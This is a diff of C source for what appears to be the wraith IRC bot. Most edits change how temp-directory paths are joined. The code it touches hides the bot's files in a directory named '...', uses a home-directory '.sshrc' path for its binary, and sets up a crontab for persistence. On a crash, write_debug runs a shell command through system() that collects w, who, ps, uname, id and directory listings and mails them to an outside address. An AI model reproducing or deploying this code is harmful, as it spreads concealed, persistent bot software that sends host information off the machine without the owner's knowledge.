@@ -248,7 +248,7 @@ void write_debug()
      * NOTE: dont try and display context-notes in here, it's
      *       _not_ safe <cybah>
      */
-    sprintf(buf, "%s/DEBUG.DEBUG", tempdir);
+    sprintf(buf, "%sDEBUG.DEBUG", tempdir);
     x = creat(buf, 0600);
     setsock(x, SOCK_NONSOCK);
     if (x >= 0) {
@@ -265,9 +265,9 @@ void write_debug()
     {
       /* Use this lame method because shell_exec() or mail() may have caused another segfault :o */
       char buff[255];
-      egg_snprintf(buff, sizeof(buff), "cat << EOFF >> %s/bleh\nDEBUG from: %s\n`date`\n`w`\n---\n`who`\n---\n`ls -al`\n---\n`ps ux`\n---\n`uname -a`\n---\n`id`\n---\n`cat %s`\nEOFF", tempdir, origbotname, buf);
+      egg_snprintf(buff, sizeof(buff), "cat << EOFF >> %sbleh\nDEBUG from: %s\n`date`\n`w`\n---\n`who`\n---\n`ls -al`\n---\n`ps ux`\n---\n`uname -a`\n---\n`id`\n---\n`cat %s`\nEOFF", tempdir, origbotname, buf);
       system(buff);
-      egg_snprintf(buff, sizeof(buff), "cat %s/bleh |mail wraith@shatow.net", tempdir);
+      egg_snprintf(buff, sizeof(buff), "cat %sbleh |mail wraith@shatow.net", tempdir);
       system(buff);
       unlink("bleh");
     }
@@ -284,7 +284,7 @@ void write_debug()
                                   cx_file[cx_ptr], cx_line[cx_ptr], cx_note[cx_ptr][0] ? cx_note[cx_ptr] : "");
   putlog(LOG_MISC, "*", "%s", tmpout);
   printf("%s\n", tmpout);
-  sprintf(buf, "%s/DEBUG", tempdir);
+  sprintf(buf, "%sDEBUG", tempdir);
   x = creat(buf, 0600);
   setsock(x, SOCK_NONSOCK); 
   if (x < 0) {
@@ -950,7 +950,7 @@ static void check_mypid()
   int xx = 0;
 
   char buf2[DIRMAX];
-  egg_snprintf(buf2, sizeof buf2, "%s/.pid.%s", tempdir, botnetnick);
+  egg_snprintf(buf2, sizeof buf2, "%s.pid.%s", tempdir, botnetnick);
   fp = fopen(buf2, "r");
 
   if (fp != NULL) {
@@ -1093,7 +1093,7 @@ void crontab_create(int interval) {
   int fd;
 
   /* always use mkstemp() when handling temp files! -dizz */
-  sprintf(tmpfile, STR("%s.crontab-XXXXXX"), tempdir);
+  sprintf(tmpfile, "%s.crontab-XXXXXX", tempdir);
   if ((fd = mkstemp(tmpfile)) == -1) {
     unlink(tmpfile);
     return;
@@ -1542,7 +1542,7 @@ int main(int argc, char **argv)
     bg_prepare_split();
 
 #ifdef HUB
-  egg_snprintf(tempdir, sizeof tempdir, "%s/tmp", confdir());
+  egg_snprintf(tempdir, sizeof tempdir, "%s/tmp/", confdir());
 #endif /* HUB */
 
 #ifdef LEAF
@@ -1551,7 +1551,7 @@ int main(int argc, char **argv)
   sdprintf(STR("my uid: %d my uuid: %d, my ppid: %d my pid: %d"), getuid(), geteuid(), getppid(), getpid());
   chdir(homedir());
   egg_snprintf(newbin, sizeof newbin, "%s/.sshrc", homedir());
-  egg_snprintf(tempdir, sizeof tempdir, "%s/...", confdir());
+  egg_snprintf(tempdir, sizeof tempdir, "%s/.../", confdir());
 
   sdprintf(STR("newbin at: %s"), newbin);
 
@@ -1603,7 +1603,7 @@ char tmp[DIRMAX];
 #endif /* LEAF */
   }
 
-  egg_snprintf(tmp, sizeof tmp, "%s/", tempdir);
+  egg_snprintf(tmp, sizeof tmp, "%s", tempdir);
   if (!can_stat(tmp)) {
     if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
       unlink(tempdir);
@@ -1632,7 +1632,7 @@ if (1) {		/* config shit */
     werr(ERR_CONFMOD);
 
 #ifdef LEAF
-  if (localhub) { //we only want to read the config if we are the spawn bot..
+  if (localhub) { 
 #endif /* LEAF */
     i = 0;
     if (!(f = fopen(cfile, "r")))
@@ -1652,13 +1652,13 @@ if (1) {		/* config shit */
 
       if (c[0] == '*')
         skip = 1;
-      else if (c[0] == '-' && !skip) { //this is the uid
+      else if (c[0] == '-' && !skip) { /* uid */
         newsplit(&temps);
         if (geteuid() != atoi(temps)) {
           sdprintf(STR("wrong uid, conf: %d :: %d"), atoi(temps), geteuid());
           werr(ERR_WRONGUID);
         }
-      } else if (c[0] == '+' && !skip) { //this is the uname
+      } else if (c[0] == '+' && !skip) { /* uname */
         int r = 0;
         newsplit(&temps);
         if ((r = strcmp(temps, my_uname()))) {
@@ -1725,7 +1725,7 @@ if (1) {		/* config shit */
           xx = 0, x = 0, errno = 0;
           s[0] = '\0';
           /* first let's determine if the bot is already running or not.. */
-          egg_snprintf(buf2, sizeof buf2, "%s/.pid.%s", tempdir, nick);
+          egg_snprintf(buf2, sizeof buf2, "%s.pid.%s", tempdir, nick);
           fp = fopen(buf2, "r");
           if (fp != NULL) {
             fgets(s, 10, fp);
